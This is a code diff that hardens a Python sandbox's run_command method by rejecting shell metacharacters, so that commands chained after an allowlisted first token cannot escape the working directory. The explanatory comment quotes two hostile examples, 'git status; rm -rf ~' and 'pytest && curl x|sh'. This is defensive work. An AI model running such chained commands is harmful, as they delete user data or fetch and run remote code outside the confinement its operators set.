@@ -181,6 +181,17 @@ class _Sandbox:
         return "\n".join(out) or "(empty)"
 
     async def run_command(self, command: str, timeout_s: int = _CMD_TIMEOUT_DEFAULT) -> str:
+        # The allowlist only inspects the first token, but the command runs
+        # through a shell — so `git status; rm -rf ~` or `pytest && curl x|sh`
+        # would pass the check yet escape the workdir confinement this class
+        # promises. Reject the shell operators that chain, redirect, or
+        # substitute, so a single allowlisted command can't break out. (Bare
+        # parens are allowed so `python -c "print(1)"` still works; command
+        # substitution `$(...)` is caught explicitly.)
+        if "$(" in command or any(c in command for c in (";", "&", "|", "`", ">", "<", "\n", "\r")):
+            raise ValueError(
+                "shell metacharacters are not allowed; run one plain command at a time"
+            )
         first = command.strip().split()[0] if command.strip() else ""
         if first not in _CMD_ALLOWLIST:
             raise ValueError(
